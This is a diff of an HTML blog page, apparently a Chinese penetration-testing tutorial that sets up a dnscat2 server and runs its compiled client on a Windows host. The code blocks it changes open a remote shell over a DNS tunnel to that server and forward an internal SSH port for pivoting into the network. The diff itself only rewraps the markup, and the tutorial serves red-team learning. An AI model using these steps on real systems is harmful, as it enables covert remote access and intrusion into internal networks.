@@ -47,33 +47,30 @@
 
 <p>测试环境</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>ubuntu 14.04 root用户
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu 14.04 root用户
 windows7 x64 user用户
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><strong>0x01环境准备</strong></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>apt-get update
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get update
 apt-get -y install ruby-dev git make g++
 gem install bundler
 git clone https://github.com/iagox86/dnscat2.git
 cd dnscat2/server
 #修改Gemfile source 'https://ruby.taobao.org/'
 bundle install
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>或者通过docker安装</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>apt-get install docker.io
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get install docker.io
 service docker status
 service docker start
 cd ~/dnscat2/server
 #修改Gemfile source 'https://ruby.taobao.org/'
 docker build .
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>安装完成之后，可能在docker images 看到这个镜像没有名字，我们修改一下 docker tag IMAGEID  mpercival/dnscat2</p>
 
@@ -81,11 +78,10 @@ docker build .
 
 <p>server端</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>cd dnscat2/server
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd dnscat2/server
 ruby ./dnscat2.rb
 #docker用户  docker run -p 53:53/udp -it --rm mpercival/dnscat2 ruby ./dnscat2.rb
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2841831801.png" alt="2841831801" /></p>
 
@@ -95,9 +91,8 @@ ruby ./dnscat2.rb
 
 <p>将dnscat2文件夹下面的client编译好成exe，然后上传到client端</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>dnscat2.exe --dns=server=server端ip --secret=c2c6d04cab68ee2947d80316858da0f8
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnscat2.exe --dns=server=server端ip --secret=c2c6d04cab68ee2947d80316858da0f8
+</code></pre></div></div>
 
 <p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3501735141.png" alt="3501735141" /></p>
 
@@ -106,11 +101,10 @@ ruby ./dnscat2.rb
 
 <p>获取shell</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>session -i 1 #切换到session 1
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>session -i 1 #切换到session 1
 help #通过help可以看到支持的命令
 shell  #执行之后会新生成一个session  需要通过session -i 2 切过去
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-842306562.png" alt="842306562" /></p>
 
@@ -125,10 +119,9 @@ shell  #执行之后会新生成一个session  需要通过session -i 2 切过�
 <p>通过Salsa20加密算法进行了加密，如果不知道秘钥，就几乎不能解密数据包了。除了普通的反弹shell和上传下载文件功能，还有一个比较有用的功能
 可以通过dnscat2实现DNS隧道，然后进行内网渗透。在成功获取一个session之后执行</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>session -i id
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>session -i id
 listen 4444 10.211.55.19:22 #将内网10.211.55.19的22端口转发到本地的4444
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2557060718.png" alt="2557060718" /></p>
 
